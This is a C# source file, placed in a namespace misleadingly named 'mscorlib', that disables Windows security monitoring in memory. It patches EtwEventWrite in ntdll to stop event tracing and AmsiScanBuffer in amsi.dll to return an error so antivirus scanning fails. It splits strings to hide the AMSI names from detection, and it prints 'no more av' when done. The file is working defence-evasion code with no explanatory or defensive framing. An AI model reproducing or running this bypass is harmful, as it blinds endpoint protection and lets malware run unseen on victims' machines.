using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace mscorlib
{
    internal class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress,
            UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static void AntiTrace()
        {
            string traceloc = "ntdll.dll";
            string magicFunction = "EtwEventWrite";
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicPass = Pass_Magic("AntiTrace");
            VirtualProtect(traceAddr, (UIntPtr)magicPass.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicPass, 0, traceAddr, magicPass.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicPass.Length, oldProtect, out uint newoldProetct);
            Console.WriteLine("no more tracing !");
        }

        static void AVbye()
        {
            string avloc = "am" + "si" + ".dll";
            string magicFunction = "Am" + "siSc" + "anB" + "uffer";
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicPass = Pass_Magic("AVbye");
            VirtualProtect(traceAddr, (UIntPtr)magicPass.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicPass, 0, traceAddr, magicPass.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicPass.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("no more av");
        }

        static byte[] Pass_Magic(string function)
        {
            byte[] patch;
            if (function.ToLower() == "antitrace")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "avbye")
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;
                }
                return patch;
            }
            else throw new ArgumentException("Function is not supported");
        }

        static void Main(string[] args)
        {
            AntiTrace();
            Console.ReadKey();
            AVbye();
            Console.ReadKey();
        }
    }
}
